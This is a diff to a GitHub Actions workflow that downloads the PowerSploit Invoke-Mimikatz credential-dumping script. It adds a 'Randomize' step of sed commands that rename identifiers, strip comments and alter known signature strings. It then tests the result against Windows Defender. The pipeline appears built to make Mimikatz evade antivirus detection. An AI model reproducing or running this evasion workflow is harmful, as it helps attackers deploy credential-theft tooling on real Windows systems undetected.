@@ -43,6 +43,23 @@ jobs:
         cd "$env:GITHUB_WORKSPACE\working"
         iwr -uri https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1 -outfile "$env:GITHUB_WORKSPACE\working\Invoke-Mimikatz.ps1"
 
+    - name: Randomize
+      run: |
+        cd "$env:GITHUB_WORKSPACE\working"
+
+        sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
+        sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
+
+        sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
+
+        sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1
+
+        sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimikatz.ps1
+
+        sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' Invoke-Mimikatz.ps1
+
+        sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1
+        
     - name: Check current with Defender
       run: |
         ls "$env:GITHUB_WORKSPACE\DefenderCheck\DefenderCheck\DefenderCheck\obj\Debug\DefenderCheck.exe"
